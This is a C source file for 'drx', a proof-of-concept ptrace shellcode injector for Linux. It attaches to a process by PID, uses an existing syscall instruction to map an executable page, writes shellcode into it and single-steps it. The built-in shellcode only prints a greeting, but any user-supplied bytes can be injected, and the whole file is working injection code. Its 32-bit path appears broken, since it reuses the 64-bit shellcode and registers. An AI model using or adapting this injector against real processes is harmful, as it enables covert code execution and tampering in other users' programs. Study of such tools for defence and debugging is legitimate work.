#define DRX_VER "v0.8-beta"

/*
drx - MIT License - Copyright 2020

David Reguera Garcia aka Dreg - dreg@fr33project.org
http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

ptrace shellcode injector

WARNING! this is a POC, the code is CRAP
*/

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <sys/mman.h>
#include <linux/limits.h>
#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#include <stdbool.h>

// Hello world x86_64
unsigned char helloworld64[] = "\xe8\x11\x00\x00\x00\x48\x65\x6c\x6c\x6f\x20\x44\x20\x52\x20\x45\x20\x47\x21\x0a\x0a\x00\x5e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xba\x11\x00\x00\x00\x0f\x05\x90";
// Hello world x86
unsigned char helloworld86[] = "\xe8\x11\x00\x00\x00\x48\x65\x6c\x6c\x6f\x20\x44\x20\x52\x20\x45\x20\x47\x21\x0a\x0a\x00\x5e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xba\x11\x00\x00\x00\x0f\x05\x90";

#pragma pack(push, 1)
typedef struct elfhdr_s
{
	unsigned char tag[4];
	unsigned char elfclass;
} elfhdr_t;
#pragma pack(pop)

typedef enum elf_plat_e
{
   ELF_PLAT_UNK,
   ELF_PLAT_32,
   ELF_PLAT_64
} elf_plat_t;

elf_plat_t GetElfPlat(pid_t pid)
{
#define ELFTAG "\x7F" "ELF"
    char proc_path[200] = { 0 };
    FILE* file = NULL;
    elfhdr_t elf = { 0 };
    elf_plat_t retf = ELF_PLAT_UNK;

    sprintf(proc_path, "/proc/%d/exe", pid);

    file = fopen(proc_path, "rb");
    if (NULL == file)
    {
        perror(proc_path);
        return ELF_PLAT_UNK;
    }

    fread(&elf, sizeof(elf), 1, file);

    if (memcmp(&elf, ELFTAG, sizeof(ELFTAG) - 1) != 0)
    {
        printf("NOT ELF");
    }

    printf("elf plat: ");
    if (elf.elfclass == 1)
    {
        puts("32");
        retf = ELF_PLAT_32;
    }
    else
    {
        puts("64");
        retf = ELF_PLAT_64;
    }

    fclose(file);

    return retf;
}

int CheckScope(void)
{
  char status[3] = { 0 };
  FILE* file;
  int retf = -1;

  #define SCOPE_PATH "/proc/sys/kernel/yama/ptrace_scope"

  file = fopen(SCOPE_PATH, "r");
  if (NULL == file)
  {
    perror("error opening " SCOPE_PATH);
    return -1;
  }

  if (!fgets(status, sizeof(status) - 1, file))
  {
     puts("error reading: " SCOPE_PATH);
  }
  else
  {
    retf = 0;
    printf(SCOPE_PATH " : %s\n", status);
  }

  fclose(file);

  return retf;
}

void PtraceReadData(pid_t pid, uint64_t addr, unsigned char *data, size_t data_size)
{
#ifdef __x86_64
    const int ult = 8;
#else
    const int ult = 4;
#endif
    const int long_size = sizeof(long);

    unsigned char* laddr = NULL;
    int i = 0;
    int j = 0;

    union u
    {
            long val;
            char chars[long_size];
    } data_u;

    i = 0;
    j = data_size / long_size;
    laddr = data;
    while(i < j)
    {
        data_u.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * ult, NULL);
        memcpy(laddr, data_u.chars, long_size);
        ++i;
        laddr += long_size;
    }
    j = data_size % long_size;
    if(j != 0)
    {
        data_u.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * ult, NULL);
        memcpy(laddr, data_u.chars, j);
    }
}

void PtraceWriteData(pid_t pid, long addr, char *data, int data_size)
{
#ifdef __x86_64
    const int ult = 8;
#else
    const int ult = 4;
#endif
    const int long_size = sizeof(long);

    char *laddr = NULL;
    int i = 0;
    int j = 0;

    union u {
            long val;
            char chars[long_size];
    } data_u;

    i = 0;
    j = data_size / long_size;
    laddr = data;
    while(i < j)
    {
        memcpy(data_u.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, pid, addr + i * ult, data_u.val);
        ++i;
        laddr += long_size;
    }
    j = data_size % long_size;
    if(j != 0)
    {
        memcpy(data_u.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, pid, addr + i * ult, data_u.val);
    }
}


#define OPCODES_SYSCALL "\x0f\x05"
#define OPCODES_INT80   "\xcd\x80"

void PrintHexBuff(unsigned char* buffer, size_t n, uint64_t base)
{
  int i = 0;
  for (int i = 0; i < n; i++)
  {
    if (i % 16 == 0)
    {
        printf("\n0x%016" PRIx64 " : ", base + i);
    }
    printf("%02X ", buffer[i]);
  }
}

uint64_t FindOpcodesAddr(pid_t pid, elf_plat_t elf_plat, unsigned char* opcodes, size_t size_opcodes)
{
    FILE *fp = NULL;
    char filename[100] = { 0 };
    char line[200] = { 0 };
    uint64_t addr = 0;
    uint64_t addr_end = 0;
    size_t addr_size = 0;
    char str[300] = { 0 };
    bool correct_entry = false;
    unsigned char* process_data = NULL;
    uint64_t retf = 0;

    sprintf(filename, "/proc/%d/maps", pid);
    printf("openning: %s\n", filename);
    fp = fopen(filename, "r");
    if(fp == NULL)
    {
        perror("open proc maps");
        return 0;
    }

    while(!retf && fgets(line, sizeof(line) - 1, fp) != NULL)
    {
        correct_entry = false;
        addr = 0;
        addr_end = 0;
        strcpy(str, "not found");

        printf("%s", line);
        if (ELF_PLAT_64 == elf_plat || ELF_PLAT_32 == elf_plat)
        {
            sscanf(line, "%llx-%llx %s", &addr, &addr_end, str);
            printf("%s\n", str);
            if (strstr(str, "x") != NULL)
            {
                puts("found valid exec entry");
            	correct_entry = true;
            }
            else
            {
                puts("not exec entry, skipping...");
	    }
        }
        if (correct_entry)
        {
            addr_size = addr_end - addr;
            printf("addr: 0x%016" PRIx64 "\n", addr);
            printf("addr_end: 0x%016" PRIx64 "\n", addr_end);
            printf("addr_size: 0x%016" PRIx64 "\n", addr_size);
            process_data = calloc(addr_size, 1);
            if (NULL == process_data)
            {
                perror("calloc addr");
            }
            else
            {
                puts("reading process memory entry....");
                PtraceReadData(pid, addr, process_data, addr_size);
                retf = (uint64_t) memmem((void*)process_data, addr_size, (void*)opcodes, size_opcodes);
                if (0 != retf)
                {
                    puts("opcodes seq found!");
                    retf -= (uint64_t)process_data;
                    printf("offset: 0x%016" PRIx64 "\n", retf);
                    //PrintHexBuff(process_data, retf + size_opcodes, addr); puts("...");
                    retf += addr;
                    printf("process addr: 0x%016" PRIx64 "\n", retf);

                }
                free(process_data);
            }
        }
        puts("");

        memset(line, 0, sizeof(line));
        memset(str, 0, sizeof(str));

    }

    fclose(fp);

    return retf;
}

void CheckCaps(void)
{
    #define PROC_SELF "/proc/self/exe"
    char own_path[PATH_MAX + 1] = { 0 };
    char cwc[sizeof(own_path) + (sizeof(PROC_SELF) * 2)] = { 0 };

    readlink(PROC_SELF, own_path, sizeof(own_path) - 1);
    printf("checking capabalities: %s\n", own_path);
    sprintf(cwc, "getcap %s", own_path);
    puts(cwc);
    system(cwc);
}

int main(int argc, char *argv[])
{
    pid_t pid = atoi(argv[1]);
    unsigned char* opcodes = NULL;
    size_t size_opcodes = 0;
    uint64_t proc_opc_addr = 0;
    struct user_regs_struct regs = { 0 };
    struct user_regs_struct saved_regs = { 0 };
    uint64_t end_shellcode = 0;
    unsigned char* shellcode = NULL;
    size_t shellcode_size = 0;
    elf_plat_t elf_plat = ELF_PLAT_UNK;

    puts("drx " DRX_VER " - MIT License - Copyright 2020\n"
         "ptrace shellcode injector\n"
	 "David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
         "http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/\n"
         "-\n"
         "syntax: ./drx pid [shellcode_string_format]\n"
         "ex: ./drx 3384 \"\\x90\\x90\\x90\"\n"
         "ex injected builtin helloworld shellcode: ./drx 3384\n"
         "-\n"
         "WARNING!: the shellcode must end with a NOP(0x90) AND the shellcode-flow must be finish in the end of itself (cip==sizeof(shellcode))\n");

    if (argc < 2)
    {
        puts("error syntax!");
        return 1;
    }

    pid = atoi(argv[1]);

    elf_plat = GetElfPlat(pid);
    if (ELF_PLAT_64 == elf_plat)
    {
        printf("%d is a 64 bit process, the shellcode must be for x86_64\n", pid);
        if (argc < 3)
        {
            puts("using builtin helloworld64 shellcode");
            shellcode = helloworld64;
            shellcode_size = sizeof(helloworld64) - 1;
        }
        puts("searching syscall instr");
        opcodes = OPCODES_SYSCALL;
        size_opcodes = sizeof(OPCODES_SYSCALL) - 1;
    }
    else
    {
        printf("%d is a 32 bit process, the shellcode must be for x86\n", pid);
        if (argc < 3)
        {
            puts("using builtin helloworld86 shellcode");
            shellcode = helloworld86;
            shellcode_size = sizeof(helloworld86) - 1;
        }
        puts("searching int0x80 instr");
        opcodes = OPCODES_INT80;
        size_opcodes = sizeof(OPCODES_INT80) - 1;
    }

    CheckScope();

    CheckCaps();

    printf("attaching %d\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
    {
        perror ("ptrace(ATTACH):");
        return 1;
    }

    printf ("waiting for process\n");
    wait (NULL);

    puts("finding valid opcodes:");
    PrintHexBuff(opcodes, size_opcodes, 0);
    puts("");
    proc_opc_addr = FindOpcodesAddr(pid, elf_plat, opcodes, size_opcodes);
    if (proc_opc_addr)
    {
        puts("allocating memory in remote process for shellcode");
        printf ("getting registers\n");
        if ((ptrace (PTRACE_GETREGS, pid, NULL, &regs)) < 0)
        {
            perror ("ptrace(GETREGS):");
        }
        saved_regs = regs;

        regs.rdi = 0;
        regs.rsi = 0x1000;
        regs.rdx = PROT_EXEC | PROT_READ;
        regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
        regs.r8 = 0;
        regs.r9 = 0;
        regs.rip = proc_opc_addr;
        regs.rax = 9;
        printf ("setting registers and executing syscall instrucction with mmap value at 0x%016" PRIx64 "\n", regs.rip);
        if ((ptrace (PTRACE_SETREGS, pid, NULL, &regs)) < 0)
        {
            perror ("ptrace(SETREGS):");
        }

        puts("stepping");
        if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
        {
            perror ("ptrace(SINGLESTEP):");
        }
        wait (NULL);

        printf ("getting registers\n");
        if ((ptrace (PTRACE_GETREGS, pid, NULL, &regs)) < 0)
        {
            perror ("ptrace(GETREGS):");
        }

        printf("mmap returns new memory: 0x%016" PRIx64 "\n", regs.rax);
        if (MAP_FAILED == (void*)regs.rax || 9 == regs.rax)
        {
            printf("error, mmap failed");
        }

        printf("new cip: 0x%016" PRIx64 "\n", regs.rip);

        printf("writing shellcode at: 0x%016" PRIx64 "\n", regs.rax);

        PtraceWriteData(pid, regs.rax, shellcode, shellcode_size);

        printf("executing shellcode via steps at: 0x%016" PRIx64 "\n", regs.rax);

        regs.rip = regs.rax;
        if ((ptrace (PTRACE_SETREGS, pid, NULL, &regs)) < 0)
        {
            perror ("ptrace(SETREGS):");
        }

        end_shellcode = regs.rax + (shellcode_size - 1);
        printf("waiting for end of shellcode reached (0x%016" PRIx64 ")\n", end_shellcode);
        while(regs.rip != end_shellcode)
        {
            printf("new cip: 0x%016" PRIx64 "\n", regs.rip);
            if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
            {
                perror ("ptrace(SINGLESTEP):");
            }
            wait (NULL);
            printf ("getting registers\n");
            if ((ptrace (PTRACE_GETREGS, pid, NULL, &regs)) < 0)
            {
                perror ("ptrace(GETREGS):");
            }
        }
        printf("end of shellcode reached: 0x%016" PRIx64 "\n", regs.rip);

        printf ("restoring original regs....\n");
        if ((ptrace (PTRACE_SETREGS, pid, NULL, &saved_regs)) < 0)
        {
            perror ("ptrace(SETREGS):");
        }
    }
    else
    {
        puts("error, not valid opcodes found, back luck!");
    }

    puts("restoring original execution");
    printf("detaching %d\n", pid);
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0)
    {
        perror ("ptrace(DETTACH):");
    }

    return 0;
}
